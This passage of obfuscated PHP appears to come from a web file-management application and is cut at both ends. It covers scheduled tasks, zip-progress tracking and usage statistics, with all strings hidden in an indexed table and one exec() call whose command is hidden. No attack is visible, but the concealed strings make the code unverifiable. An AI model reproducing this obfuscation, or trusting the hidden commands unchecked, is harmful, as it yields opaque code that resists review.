3600 * 24 * 7) { return !1; } $ª×ìºˆá = date($éíÔ¥™†[1686]) == 0 ? 7 : date($éíÔ¥™†[1686]); if ($ÄòõÄÓø[$éíÔ¥™†[1685]] == $ª×ìºˆá && $Êãô„ìò) { return !0; } break; case $éíÔ¥™†[1678]: if (time() - $Ï³õç° < 3600 * 24) { return !1; } if ($Êãô„ìò) { return !0; } break; case $éíÔ¥™†[1687]: if (time() - $Ï³õç° >= floatval($ÄòõÄÓø[$éíÔ¥™†[1687]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $½õÒµ• =& $_SERVER[•Ùç É]; static $‹²ûì´É = 0; $™áºì´ = 300; if (!$‹²ûì´É) { $‹²ûì´É = time(); } if (time() - $‹²ûì´É < $™áºì´) { return; } $‹²ûì´É = time(); $œà½Ÿ°É = Model($½õÒµ•[548])->db($½õÒµ•[12]); if ($œà½Ÿ°É) { $œà½Ÿ°É->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($½õÒµ•[1688], $½õÒµ•[1689]); die; } } public static function taskRun($ø·´Š×) { $èæ¨í© =& $_SERVER[•Ùç É]; self::log($èæ¨í©[1690] . $ø·´Š×[$èæ¨í©[445]] . $èæ¨í©[1691] . $ø·´Š×[$èæ¨í©[32]] . $èæ¨í©[1692] . $ø·´Š×[$èæ¨í©[1693]]); Model($èæ¨í©[1674])->run($ø·´Š×[$èæ¨í©[445]]); $çùˆˆÌø = timeFloat(); $Ë™ì’ÙË = $èæ¨í©[12]; switch ($ø·´Š×[$èæ¨í©[33]]) { case $èæ¨í©[353]: $â³âîÏÆ = url_request($ø·´Š×[$èæ¨í©[1693]], $èæ¨í©[247], !1, !1, !1, !1, 10); if ($â³âîÏÆ[$èæ¨í©[795]]) { $Ë™ì’ÙË = strlen($â³âîÏÆ[$èæ¨í©[1253]]); } break; case $èæ¨í©[246]: $Ë™ì’ÙË = Hook::apply($ø·´Š×[$èæ¨í©[1693]]); default: break; } Model($èæ¨í©[1694])->add(array($èæ¨í©[1695] => $èæ¨í©[12], $èæ¨í©[1696] => $èæ¨í©[214], $èæ¨í©[33] => $èæ¨í©[1697] . $ø·´Š×[$èæ¨í©[445]], $èæ¨í©[1698] => json_encode(array($èæ¨í©[32] => $ø·´Š×[$èæ¨í©[32]], $èæ¨í©[1699] => timeFloat() - $çùˆˆÌø, $èæ¨í©[339] => $Ë™ì’ÙË)))); $†Ÿ˜¼× = $Ë™ì’ÙË ? $èæ¨í©[1700] . $Ë™ì’ÙË : $èæ¨í©[12]; self::log($èæ¨í©[1701] . $ø·´Š×[$èæ¨í©[445]] . $èæ¨í©[167] . $†Ÿ˜¼×); return !0; } public static function valueGet($’¡–‡òŸ) { $ÜìÑ¥Ş¥ =& $_SERVER[•Ùç É]; $Ñ¬ıÃ»× = $ÜìÑ¥Ş¥[1702]; $êçÛÁ›» = Model($ÜìÑ¥Ş¥[478])->get($’¡–‡òŸ, $Ñ¬ıÃ»×); if (is_null($êçÛÁ›»)) { Model($ÜìÑ¥Ş¥[478])->set($ÜìÑ¥Ş¥[795], $ÜìÑ¥Ş¥[90], $Ñ¬ıÃ»×); Model($ÜìÑ¥Ş¥[478])->set($ÜìÑ¥Ş¥[1655], $ÜìÑ¥Ş¥[214], $Ñ¬ıÃ»×); $êçÛÁ›» = Model($ÜìÑ¥Ş¥[478])->get($’¡–‡òŸ, $Ñ¬ıÃ»×); } return $êçÛÁ›»; } private static function valueSet($¢»Œ¸ĞÈ, $Õƒòê„Â = false) { $ş·Ÿ„»Š =& $_SERVER[•Ùç É]; $¹ğ¹“ø  = $ş·Ÿ„»Š[1703]; CacheLock::lock($¹ğ¹“ø ); $ìíÊ¬æÉ = Model($ş·Ÿ„»Š[478])->set($¢»Œ¸ĞÈ, $Õƒòê„Â, $ş·Ÿ„»Š[1702]); CacheLock::unlock($¹ğ¹“ø ); return $ìíÊ¬æÉ; } protected static function log($Ùå••œÏ) { write_log($Ùå••œÏ, $_SERVER[•Ùç É][1689]); } private static function cacheClear() { $˜©Øã÷› =& $_SERVER[•Ùç É]; Cache::clearMemory(Model($˜©Øã÷›[478])->cacheKey($˜©Øã÷›[1702])); Cache::clearMemory(Model($˜©Øã÷›[478])->cacheKey($˜©Øã÷›[1704])); Model($˜©Øã÷›[1674])->cacheClear(); self::closeDatabase(); } } goto Cáï¤ïì²Ï; CÀ„É§òÕ: define($_SERVER[•Ùç É][287], 1); define($_SERVER[•Ùç É][288], 0); define($_SERVER[•Ùç É][289], 2); goto CÀÇÉ·«; A‚·«ô†«¨: define($_SERVER[•Ùç É][647], $_SERVER[•Ùç É][648]); $hrgwpjxies = $_SERVER[•Ùç É][649]; if (!$hrgwpjxies) { return; } goto Dğ›‹¤Ä¢½; AŞÛ‰²ŞÓç: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÙŞË¤Ş =& $_SERVER[•Ùç É]; parent::startAfter(); Hook::bind($ÙŞË¤Ş[1830], array($this, $ÙŞË¤Ş[1820])); Hook::bind($ÙŞË¤Ş[1822], array($this, $ÙŞË¤Ş[1823])); $ƒ…Ô“Çş =& $this->task; $ƒ…Ô“Çş[$ÙŞË¤Ş[1824]] = $ÙŞË¤Ş[1245]; if (!$ƒ…Ô“Çş[$ÙŞË¤Ş[1593]]) { $ƒ…Ô“Çş[$ÙŞË¤Ş[1593]] = LNG($ÙŞË¤Ş[1831]); } } protected function endAfter() { $ ßû­® =& $_SERVER[•Ùç É]; parent::endAfter(); Hook::unbind($ ßû­®[1830], array($this, $ ßû­®[1820])); Hook::unbind($ ßû­®[1822], array($this, $ ßû­®[1823])); } public function updateAfter() { $Ø‚»ÕÌ× =& $_SERVER[•Ùç É]; $ĞºÒøÉ› =& $this->task; if (!$ĞºÒøÉ›[$Ø‚»ÕÌ×[831]] || !$ĞºÒøÉ›[$Ø‚»ÕÌ×[808]]) { return; } if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1824]] == $Ø‚»ÕÌ×[1245]) { $ÉµıÓ = $ĞºÒøÉ›[$Ø‚»ÕÌ×[1759]]; if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1760]] != $Ø‚»ÕÌ×[1245]) { $ÉµıÓ = 0; } $á—°°×¬ = ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1763]] + $ÉµıÓ) / $ĞºÒøÉ›[$Ø‚»ÕÌ×[808]]; $ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]] = $á—°°×¬ * 0.3; } else { if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1824]] == $Ø‚»ÕÌ×[359]) { $á—°°×¬ = $ĞºÒøÉ›[$Ø‚»ÕÌ×[1706]] / $ĞºÒøÉ›[$Ø‚»ÕÌ×[831]]; $ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]] = 0.3 + $á—°°×¬ * 0.5; } else { if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1824]] == $Ø‚»ÕÌ×[109]) { $á—°°×¬ = 0; if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1758]]) { $á—°°×¬ = $ĞºÒøÉ›[$Ø‚»ÕÌ×[1759]] / $ĞºÒøÉ›[$Ø‚»ÕÌ×[1758]]; } $ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]] = 0.3 + 0.5 + $á—°°×¬ * 0.2; } } } if ($ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]] > 0) { $ü‡™¨Õí = timeFloat() - $ĞºÒøÉ›[$Ø‚»ÕÌ×[1709]] - $ĞºÒøÉ›[$Ø‚»ÕÌ×[1712]]; $ĞºÒøÉ›[$Ø‚»ÕÌ×[1713]] = $ü‡™¨Õí * (1 - $ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]]) / $ĞºÒøÉ›[$Ø‚»ÕÌ×[1707]]; } } public function copyFileStart($Éæ÷’ÄÁ, $Îôã÷¿¹, $ª±£·›, $¾Ê™¢¢Õ, $İ¢›»ã´, $÷¨âñª) { $¬˜—Ø‘“ =& $_SERVER[•Ùç É]; parent::copyFileStart($Éæ÷’ÄÁ, $Îôã÷¿¹, $ª±£·›, $¾Ê™¢¢Õ, $İ¢›»ã´, $÷¨âñª); $¯è¬Çƒ› =& $this->task; if ($¯è¬Çƒ›[$¬˜—Ø‘“[1824]] == $¬˜—Ø‘“[359]) { $¯è¬Çƒ›[$¬˜—Ø‘“[1824]] = $¬˜—Ø‘“[109]; } $this->update(); } public function copyFileEnd($ß¥äòÑì, $âû®§½„, $ºÄ‚ç‡Ÿ, $›’Åñü, $Ÿ±±˜ó, $ó€£ÒÃÔ) { $í¯îêâé =& $_SERVER[•Ùç É]; $¸òÅ¢ó =& $this->task; $¸òÅ¢ó[$í¯îêâé[1759]] = $¸òÅ¢ó[$í¯îêâé[1758]]; $¸òÅ¢ó[$í¯îêâé[1763]] += $¸òÅ¢ó[$í¯îêâé[1758]]; $¸òÅ¢ó[$í¯îêâé[1760]] = $í¯îêâé[12]; $this->update(); } public function zipEvent($ûÊëö©°, $á—Ä’œ´, $Ğ´ƒã¹‚, $Õİ±Â¢ï) { $úğ÷‚ñ =& $_SERVER[•Ùç É]; $„üàŞöè =& $this->task; $„üàŞöè[$úğ÷‚ñ[1756]] = get_path_this($á—Ä’œ´); $„üàŞöè[$úğ÷‚ñ[1758]] = $Õİ±Â¢ï; $„üàŞöè[$úğ÷‚ñ[1759]] = $Ğ´ƒã¹‚; $„üàŞöè[$úğ÷‚ñ[1115]] = $ûÊëö©° == $úğ÷‚ñ[1832] ? $úğ÷‚ñ[1827] : $úğ÷‚ñ[1828]; $„üàŞöè[$úğ÷‚ñ[1760]] = $úğ÷‚ñ[12]; $„üàŞöè[$úğ÷‚ñ[808]] = $Õİ±Â¢ï; $„üàŞöè[$úğ÷‚ñ[1824]] = $úğ÷‚ñ[359]; $this->update(); } public function nameParse($Ïğ³„Üî) { $íçĞ¸â =& $_SERVER[•Ùç É]; $¥É½Ïãƒ =& $this->task; if ($¥É½Ïãƒ[$íçĞ¸â[1706]] < $¥É½Ïãƒ[$íçĞ¸â[831]]) { $áñÅ¿•… = get_path_this($Ïğ³„Üî); if (strstr($áñÅ¿•…, $íçĞ¸â[10])) { $¥É½Ïãƒ[$íçĞ¸â[1706]] += 1; } } if ($¥É½Ïãƒ[$íçĞ¸â[1824]] == $íçĞ¸â[1245]) { $¥É½Ïãƒ[$íçĞ¸â[1824]] = $íçĞ¸â[359]; } $¥É½Ïãƒ[$íçĞ¸â[1756]] = $Ïğ³„Üî; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($‡¾—öÔö) { $ÊËòĞ—Á =& $_SERVER[•Ùç É]; $œé‹ßµÙ = array($ÊËòĞ—Á[632] => array($ÊËòĞ—Á[33] => $ÊËòĞ—Á[1833], $ÊËòĞ—Á[319] => array($ÊËòĞ—Á[241], $ÊËòĞ—Á[810], $ÊËòĞ—Á[1834], $ÊËòĞ—Á[1835])), $ÊËòĞ—Á[1836] => array($ÊËòĞ—Á[33] => $ÊËòĞ—Á[1837], $ÊËòĞ—Á[319] => array($ÊËòĞ—Á[241], $ÊËòĞ—Á[808], $ÊËòĞ—Á[1838], $ÊËòĞ—Á[1839], $ÊËòĞ—Á[1840]))); if (!isset($œé‹ßµÙ[$‡¾—öÔö])) { return !1; } $this->optionType = $œé‹ßµÙ[$‡¾—öÔö][$ÊËòĞ—Á[33]]; $this->field = $œé‹ßµÙ[$‡¾—öÔö][$ÊËòĞ—Á[319]]; return !0; } public function listData($ñŸä¼å = false, $î ¶ú«¤ = "\x6d\x6f\144\x69\146\171\x54\x69\155\145", $Á˜ìáÓ£ = false) { return parent::listData($ñŸä¼å, $î ¶ú«¤, $Á˜ìáÓ£); } public function trendList($Ôûäëú) { $úÀ´èôı =& $_SERVER[•Ùç É]; $‘Üšâ± = $this->listData(); if ($‘Üšâ±) { $ó³ÌÌ° = end($‘Üšâ±); $çø­îé× = date($úÀ´èôı[1841], strtotime($úÀ´èôı[1842])); if ($ó³ÌÌ°[$úÀ´èôı[241]] == $çø­îé×) { return $‘Üšâ±; } $Åì±Ü‹ = strtotime($ó³ÌÌ°[$úÀ´èôı[241]]); } if (!isset($Åì±Ü‹)) { $ìíË›õ = $Ôûäëú == $úÀ´èôı[632] ? $úÀ´èôı[569] : $úÀ´èôı[870]; $Åì±Ü‹ = Model($ìíË›õ)->min($úÀ´èôı[217]); } $¨ç‘…°¥ = $úÀ´èôı[1843] . ucfirst($Ôûäëú); $ÍõØ½‹ú = $this->dateList($Åì±Ü‹); foreach ($ÍõØ½‹ú as $çø­îé×) { $this->{$¨ç‘…°¥}($çø­îé×); } return $this->listData(); } private function dateList($´çºòû¼) { $¸¿îÙ‡ö =& $_SERVER[•Ùç É]; $†Ù²‹Ï = $´çºòû¼; $õôª¾ë = strtotime($¸¿îÙ‡ö[1842]); $ªĞò´› = array(); while ($†Ù²‹Ï <= $õôª¾ë) { $ªĞò´›[] = date($¸¿îÙ‡ö[1841], $†Ù²‹Ï); $†Ù²‹Ï = strtotime($¸¿îÙ‡ö[1844], $†Ù²‹Ï); } return $ªĞò´›; } public function _recordUser($–Ó©šÏ = '') { $ø°µÄÌ =& $_SERVER[•Ùç É]; $˜­§‚ı• = strtotime(date($ø°µÄÌ[1845], strtotime($–Ó©šÏ))); $ËŞı¯Ìé = strtotime(date($ø°µÄÌ[1846], strtotime($–Ó©šÏ))); $£ø—îÄï = array($ø°µÄÌ[217] => array($ø°µÄÌ[1064], $ËŞı¯Ìé)); $¾×Ú•æ = Model($ø°µÄÌ[569])->where($£ø—îÄï)->count($ø°µÄÌ[1705]); $£ø—îÄï[$ø°µÄÌ[217]] = array($ø°µÄÌ[379], array($˜­§‚ı•, $ËŞı¯Ìé)); $ãİÁòë = Model($ø°µÄÌ[569])->where($£ø—îÄï)->count($ø°µÄÌ[1705]); $£ø—îÄï[$ø°µÄÌ[33]] = $ø°µÄÌ[1847]; $öîÙ“ = Model($ø°µÄÌ[1848])->where($£ø—îÄï)->count($ø°µÄÌ[1849]); $È‡ªá³³ = array($ø°µÄÌ[241] => $–Ó©šÏ, $ø°µÄÌ[810] => (int) $¾×Ú•æ, $ø°µÄÌ[1834] => (int) $ãİÁòë, $ø°µÄÌ[1835] => (int) $öîÙ“); return $this->insert($È‡ªá³³); } public function _recordStore($µ©î¯œ = '') { $Ï¬Ô¿”ï =& $_SERVER[•Ùç É]; $ëó¿øÊ½ = strtotime(date($Ï¬Ô¿”ï[1846], strtotime($µ©î¯œ))); $Ö”İ®ÂÕ = array($Ï¬Ô¿”ï[217] => array($Ï¬Ô¿”ï[1064], $ëó¿øÊ½)); $•İª¥¨ = Model($Ï¬Ô¿”ï[514])->where($Ö”İ®ÂÕ)->sum($Ï¬Ô¿”ï[78]); $Ö”İ®ÂÕ[$Ï¬Ô¿”ï[455]] = 0; $ï‹ï¸ÃË = Model($Ï¬Ô¿”ï[870])->where($Ö”İ®ÂÕ)->sum($Ï¬Ô¿”ï[78]); $Ö”İ®ÂÕ[$Ï¬Ô¿”ï[180]] = 1; $İõ¶¡ı¼ = Model($Ï¬Ô¿”ï[870])->where($Ö”İ®ÂÕ)->sum($Ï¬Ô¿”ï[78]); $Ö”İ®ÂÕ[$Ï¬Ô¿”ï[180]] = 2; $åãÀãÌ” = Model($Ï¬Ô¿”ï[870])->where($Ö”İ®ÂÕ)->sum($Ï¬Ô¿”ï[78]); $ğóâÎ›ü = array($Ï¬Ô¿”ï[241] => $µ©î¯œ, $Ï¬Ô¿”ï[808] => (int) $ï‹ï¸ÃË, $Ï¬Ô¿”ï[1838] => (int) $•İª¥¨, $Ï¬Ô¿”ï[1839] => (int) $İõ¶¡ı¼, $Ï¬Ô¿”ï[1840] => (int) $åãÀãÌ”); return $this->insert($ğóâÎ›ü); } public function trend($«äñ¼çÃ, $ ¸§–Š¦) { $®Ø…™ã÷ =& $_SERVER[•Ùç É]; if (!$this->init($«äñ¼çÃ)) { return !1; } $ıÈ·°  = $this->trendList($«äñ¼çÃ); if ($ıÈ·°  && $ ¸§–Š¦ != $®Ø…™ã÷[1678]) { $á¹Í©±“ = $ıÈ·° [0][$®Ø…™ã÷[241]]; $¶®©Ë§Â = $this->validDate($ ¸§–Š¦, $á¹Í©±“); $Â­Œ¸äö = array(); $Ë…êåßË = array_to_keyvalue($ıÈ·° , $®Ø…™ã÷[241]); foreach ($¶®©Ë§Â as $±ŠûàÈ¸) { if (isset($Ë…êåßË[$±ŠûàÈ¸])) { $è‡ŠÃÁ = $Ë…êåßË[$±ŠûàÈ¸]; } else { $è‡ŠÃÁ = end($ıÈ·° ); $è‡ŠÃÁ[$®Ø…™ã÷[241]] = $±ŠûàÈ¸; if ($«äñ¼çÃ == $®Ø…™ã÷[632]) { $è‡ŠÃÁ[$®Ø…™ã÷[1834]] = $è‡ŠÃÁ[$®Ø…™ã÷[1835]] = 0; } } $Â­Œ¸äö[] = $è‡ŠÃÁ; } $ıÈ·°  = $Â­Œ¸äö; } $™ÑóòŞ° = array($®Ø…™ã÷[632] => array($®Ø…™ã÷[810] => LNG($®Ø…™ã÷[1850]), $®Ø…™ã÷[1834] => LNG($®Ø…™ã÷[1851]), $®Ø…™ã÷[1835] => LNG($®Ø…™ã÷[1852])), $®Ø…™ã÷[1836] => array($®Ø…™ã÷[808] => LNG($®Ø…™ã÷[1853]), $®Ø…™ã÷[1838] => LNG($®Ø…™ã÷[1854]), $®Ø…™ã÷[1839] => LNG($®Ø…™ã÷[1855]), $®Ø…™ã÷[1840] => LNG($®Ø…™ã÷[1856]))); $´Æ­ì = array($®Ø…™ã÷[632] => $®Ø…™ã÷[1857], $®Ø…™ã÷[1836] => $®Ø…™ã÷[78]); if (empty($ıÈ·° )) { $±ŠûàÈ¸ = date($®Ø…™ã÷[1841], strtotime($®Ø…™ã÷[1842])); $Ä››„™— = array($®Ø…™ã÷[241] => $±ŠûàÈ¸); foreach ($™ÑóòŞ°[$«äñ¼çÃ] as $õ£æ‘û => $¬ãŸ‚ã“) { $Ä››„™—[$õ£æ‘û] = 0; } $ıÈ·° [] = $Ä››„™—; } $ÍÖÜ·ä = array(); foreach ($ıÈ·°  as $¬ãŸ‚ã“) { if ($«äñ¼çÃ == $®Ø…™ã÷[1836] && $¬ãŸ‚ã“[$®Ø…™ã÷[1838]] > $¬ãŸ‚ã“[$®Ø…™ã÷[808]]) { $¬ãŸ‚ã“[$®Ø…™ã÷[1838]] = $¬ãŸ‚ã“[$®Ø…™ã÷[808]]; } foreach ($™ÑóòŞ°[$«äñ¼çÃ] as $õ£æ‘û => $ò ‘º¡) { $è‡ŠÃÁ = array($®Ø…™ã÷[241] => $¬ãŸ‚ã“[$®Ø…™ã÷[241]], $®Ø…™ã÷[1593] => $ò ‘º¡); $è‡ŠÃÁ[$´Æ­ì[$«äñ¼çÃ]] = isset($¬ãŸ‚ã“[$õ£æ‘û]) ? $¬ãŸ‚ã“[$õ£æ‘û] : 0; $ÍÖÜ·ä[] = $è‡ŠÃÁ; } } return $ÍÖÜ·ä; } public function validDate($ûğÈ£ª, $‹ÜéªÈ­) { $ÉáŸ„€ =& $_SERVER[•Ùç É]; $¢†Íˆéö = date($ÉáŸ„€[1841], strtotime($ÉáŸ„€[1842])); $ÁúÒ¶»· = array($¢†Íˆéö); switch ($ûğÈ£ª) { case $ÉáŸ„€[1685]: $»òãÕ–° = mktime(0, 0, 0, date($ÉáŸ„€[1858]), date($ÉáŸ„€[1412]) - date($ÉáŸ„€[1477]) + 7 - 7, date($ÉáŸ„€[1859])); $È¨Œî¤¯ = 0; do { $ñóáöœ¥ = date($ÉáŸ„€[1841], $»òãÕ–° - 3600 * 24 * 7 * $È¨Œî¤¯); $ÁúÒ¶»·[] = $ñóáöœ¥; $È¨Œî¤¯++; } while ($‹ÜéªÈ­ < $ñóáöœ¥); break; case $ÉáŸ„€[1683]: $È¨Œî¤¯ = 1; do { $ø„°¼Ú = date($ÉáŸ„€[1860], strtotime("\x2d\x20{$È¨Œî¤¯}\40\x6d\157\x6e\164\150\163")); $ÁúÒ¶»·[] = $ø„°¼Ú; $È¨Œî¤¯++; } while ($‹ÜéªÈ­ < $ø„°¼Ú); break; case $ÉáŸ„€[1861]: $Ã¡©äâó = (int) date($ÉáŸ„€[1859], strtotime($‹ÜéªÈ­)); $ÚĞë¶¸ = (int) date($ÉáŸ„€[1859]); if ($Ã¡©äâó >= $ÚĞë¶¸) { break; } for ($Ã¡©äâó; $Ã¡©äâó < $ÚĞë¶¸; $Ã¡©äâó++) { $ÁúÒ¶»·[] = $Ã¡©äâó . $ÉáŸ„€[1862]; } break; default: break; } if ($‹ÜéªÈ­ > end($ÁúÒ¶»·)) { array_pop($ÁúÒ¶»·); } sort($ÁúÒ¶»·); return $ÁúÒ¶»·; } public function listTable($Á•¼æøï) { $İÕèëşÎ = ucfirst($Á•¼æøï); return Model($İÕèëşÎ)->listData(); } public function option($î»æŒÇâ) { $ùİÔß¤Ş = $_SERVER[•Ùç É][1863] . ucfirst($î»æŒÇâ); return $this->{$ùİÔß¤Ş}(); } private function optionUser() { $À¤¾™³¡ =& $_SERVER[•Ùç É]; $ÔˆßãƒÃ = Model($À¤¾™³¡[569])->count($À¤¾™³¡[1705]); $¢¡èÏá‹ = Model($À¤¾™³¡[569])->where($À¤¾™³¡[1864])->count($À¤¾™³¡[1705]); $Ê–¨Ï„ = intval($GLOBALS[$À¤¾™³¡[6]][$À¤¾™³¡[395]][$À¤¾™³¡[1651]]) / 3600; $®ÆšÈÈ¤ = strtotime("\x2d{$Ê–¨Ï„}\x20\x68\x6f\x75\x72\163"); $ï·Œº‡Ï = strtotime(date($À¤¾™³¡[1845])); if ($®ÆšÈÈ¤ < $ï·Œº‡Ï) { $®ÆšÈÈ¤ = $ï·Œº‡Ï; } $íè¼ïÉü = array($À¤¾™³¡[1865] => array($À¤¾™³¡[1065], $®ÆšÈÈ¤)); $ƒ˜÷Ááş = (int) Model($À¤¾™³¡[569])->where($íè¼ïÉü)->count($À¤¾™³¡[1705]); if (!$ƒ˜÷Ááş) { $ƒ˜÷Ááş = 1; } $íè¼ïÉü = array($À¤¾™³¡[1865] => array($À¤¾™³¡[1065], $ï·Œº‡Ï)); $¼‰»Î¨ = Model($À¤¾™³¡[569])->where($íè¼ïÉü)->count($À¤¾™³¡[1705]); return array($À¤¾™³¡[803] => (int) $ÔˆßãƒÃ, $À¤¾™³¡[1866] => (int) ($ÔˆßãƒÃ - $¢¡èÏá‹), $À¤¾™³¡[1867] => (int) $¢¡èÏá‹, $À¤¾™³¡[1868] => (int) $¼‰»Î¨, $À¤¾™³¡[1869] => $ƒ˜÷Ááş); } private function optionFile() { $×ª±’©» =& $_SERVER[•Ùç É]; $õè××µİ = $this->sourceSize(); $íªÛÂÜè = $õè××µİ[$×ª±’©»[78]]; $†ƒŞû˜ = $õè××µİ[$×ª±’©»[1838]]; $–—æÍªœ = Model($×ª±’©»[870])->where(array($×ª±’©»[455] => 0))->count($×ª±’©»[183]); $¼Î£…Ä‘ = array($×ª±’©»[455] => 0, $×ª±’©»[217] => array($×ª±’©»[1065], strtotime(date($×ª±’©»[1845])))); $ÜŠòà¯ = Model($×ª±’©»[870])->where($¼Î£…Ä‘)->sum($×ª±’©»[78]); $°Ò”Æ› = Model($×ª±’©»[870])->where($¼Î£…Ä‘)->count($×ª±’©»[183]); return array($×ª±’©»[808] => $íªÛÂÜè, $×ª±’©»[1838] => $†ƒŞû˜, $×ª±’©»[1870] => $íªÛÂÜè - $†ƒŞû˜, $×ª±’©»[1871] => (int) $ÜŠòà¯, $×ª±’©»[810] => (int) $–—æÍªœ, $×ª±’©»[1872] => (int) $°Ò”Æ›); } private function optionAccess() { $™¹Ø©ö =& $_SERVER[•Ùç É]; return array($™¹Ø©ö[803] => $this->typeLogCnt(), $™¹Ø©ö[109] => $this->typeLogCnt($™¹Ø©ö[109]), $™¹Ø©ö[495] => $this->typeLogCnt($™¹Ø©ö[495]), $™¹Ø©ö[1873] => $this->typeLogCnt($™¹Ø©ö[1873]), $™¹Ø©ö[1874] => $this->typeLogCnt($™¹Ø©ö[1874]), $™¹Ø©ö[632] => $this->typeLogCnt($™¹Ø©ö[12], $™¹Ø©ö[1849])); } private function typeLogCnt($®¦¦¼ = '', $ÁÆ™¨ˆÜ = "\151\x64") { $¢¿¯ŠƒÆ =& $_SERVER[•Ùç É]; $×ùó = array($¢¿¯ŠƒÆ[109] => array($¢¿¯ŠƒÆ[1875], $¢¿¯ŠƒÆ[1876]), $¢¿¯ŠƒÆ[495] => array($¢¿¯ŠƒÆ[1877], $¢¿¯ŠƒÆ[1878]), $¢¿¯ŠƒÆ[1873] => array($¢¿¯ŠƒÆ[1879], $¢¿¯ŠƒÆ[1880], $¢¿¯ŠƒÆ[1881]), $¢¿¯ŠƒÆ[1874] => array($¢¿¯ŠƒÆ[1882], $¢¿¯ŠƒÆ[1883]), $¢¿¯ŠƒÆ[1884] => array($¢¿¯ŠƒÆ[1885], $¢¿¯ŠƒÆ[1886], $¢¿¯ŠƒÆ[1887])); $Ñ†˜ñ– = strtotime(date($¢¿¯ŠƒÆ[1845])); $Ä’Ï¾¥‘ = array($¢¿¯ŠƒÆ[217] => array($¢¿¯ŠƒÆ[1065], $Ñ†˜ñ–)); if ($®¦¦¼) { $Ä’Ï¾¥‘[$¢¿¯ŠƒÆ[33]] = array($¢¿¯ŠƒÆ[7], $×ùó[$®¦¦¼]); } $ôçºÆ«ß = Model($¢¿¯ŠƒÆ[1848])->where($Ä’Ï¾¥‘)->count($ÁÆ™¨ˆÜ); return (int) $ôçºÆ«ß; } private function optionServer() { $õšû¿ì =& $_SERVER[•Ùç É]; $±Â÷½Ìó = $this->diskDriver(); $Ö»ä°¼ñ = KodIO::defaultDriver(); $°öè—°„ = array($õšû¿ì[862] => $Ö»ä°¼ñ[$õšû¿ì[445]]); $îûŞè•» = Model($õšû¿ì[514])->where($°öè—°„)->sum($õšû¿ì[78]); $şáœ£ÜÒ = explode($õšû¿ì[53], $_SERVER[$õšû¿ì[146]]); $øí”›óî = $şáœ£ÜÒ[0]; $ÀÂ‚»™› = $GLOBALS[$õšû¿ì[6]][$õšû¿ì[21]]; $Ä‡†Î– = $ÀÂ‚»™›[$õšû¿ì[1027]]; if ($Ä‡†Î– == $õšû¿ì[1015]) { $§ó¦Ï¸é = explode($õšû¿ì[1333], $ÀÂ‚»™›[$õšû¿ì[1026]]); $Ä‡†Î– = $§ó¦Ï¸é[0]; } if ($Ä‡†Î– == $õšû¿ì[963] || $Ä‡†Î– == $õšû¿ì[849]) { $°ëı¦Ÿ¼ = Model()->db()->query($õšû¿ì[1888]); $èÃïš‹ = $°ëı¦Ÿ¼[0] && isset($°ëı¦Ÿ¼[0][$õšû¿ì[1592]]) ? $°ëı¦Ÿ¼[0][$õšû¿ì[1592]] : 0; $Ä‡†Î– = $õšû¿ì[1889] . ($èÃïš‹ ? $õšû¿ì[8] . $èÃïš‹ : $õšû¿ì[12]); } $ºÇ®Ìª = $GLOBALS[$õšû¿ì[6]][$õšû¿ì[395]][$õšû¿ì[872]]; return array($õšû¿ì[1890] => $±Â÷½Ìó ? $±Â÷½Ìó[$õšû¿ì[1891]] : 0, $õšû¿ì[1892] => $±Â÷½Ìó ? $±Â÷½Ìó[$õšû¿ì[1893]] : 0, $õšû¿ì[1894] => (int) $Ö»ä°¼ñ[$õšû¿ì[1891]] * 1024 * 1024 * 1024, $õšû¿ì[1895] => (int) $îûŞè•», $õšû¿ì[1896] => ucfirst($øí”›óî), $õšû¿ì[1897] => $õšû¿ì[1898] . PHP_VERSION, $õšû¿ì[1899] => phpBuild64() ? 64 : 32, $õšû¿ì[802] => str_replace($õšû¿ì[1181], $õšû¿ì[1043], $Ä‡†Î–), $õšû¿ì[395] => ucfirst($ºÇ®Ìª), $õšû¿ì[32] => $_SERVER[$õšû¿ì[1900]]); } private function diskDriver() { $ÎÊº•òú =& $_SERVER[•Ùç É]; $™¥§½™í = $ÎÊº•òú[8]; $¶„Üµªö = $GLOBALS[$ÎÊº•òú[6]][$ÎÊº•òú[1350]] == $ÎÊº•òú[1351]; if ($¶„Üµªö) { $™¥§½™í = $ÎÊº•òú[1901]; if (function_exists($ÎÊº•òú[1902])) { exec($ÎÊº•òú[1903], $Ñğ»ÁéŠ); $™¥§½™í = $Ñğ»ÁéŠ[1] . $ÎÊº•òú[8]; } } if (!file_exists($™¥§½™í)) { return; } $“åÆ«»ï = @disk_total_space($™¥§½™í); $ÙÅÖ÷– = $“åÆ«»ï - @disk_free_space($™¥§½™í); return array($ÎÊº•òú[1891] => $“åÆ«»ï, $ÎÊº•òú[1893] => $ÙÅÖ÷–); } public function fileChart($”·À±ƒ°) { $ØÖºŠ€Æ =& $_SERVER[•Ùç É]; if (isset($”·À±ƒ°[$ØÖºŠ€Æ[1705]])) { return Model($ØÖºŠ€Æ[870])->userFileTypeProfile($”·À±ƒ°[$ØÖºŠ€Æ[1705]]); } if (isset($”·À±ƒ°[$ØÖºŠ€Æ[1904]])) { return Model($ØÖºŠ€Æ[870])->groupFileTypeProfile($”·À±ƒ°[$ØÖºŠ€Æ[1904]]); } $òîÏ‹ƒå = $this->sourceSize(); $‡­¶Çºì = array($ØÖºŠ€Æ[182] => 0, $ØÖºŠ€Æ[180] => 1); $º¥Ã‰‹ = Model($ØÖºŠ€Æ[870])->where($‡­¶Çºì)->sum($ØÖºŠ€Æ[78]); $‡­¶Çºì[$ØÖºŠ€Æ[180]] = 2; $£îÊÚ º = Model($ØÖºŠ€Æ[870])->where($‡­¶Çºì)->sum($ØÖºŠ€Æ[78]); return array($ØÖºŠ€Æ[808] => $òîÏ‹ƒå[$ØÖºŠ€Æ[78]], 